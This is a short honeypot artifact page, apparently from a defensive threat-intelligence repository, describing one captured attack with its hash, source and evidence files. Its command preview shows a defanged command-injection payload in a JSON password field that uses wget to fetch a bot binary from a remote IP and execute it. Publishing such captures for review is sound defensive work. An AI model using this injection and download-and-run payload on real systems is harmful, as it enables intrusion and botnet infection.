# 34ef5cd158eb302207d2214e71212ca784f871ff16f2803f44d0b2b68c3b04ef

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `34ef5cd158eb302207d2214e71212ca784f871ff16f2803f44d0b2b68c3b04ef` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
{"password":"$(wget -q -O /tmp/bot_x86_64 hxxp://184[.]174[.]96[.]XXX:8114/bot.x86_64; chmod +x /tmp/bot_x86_64; /tmp/bot_x86_
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
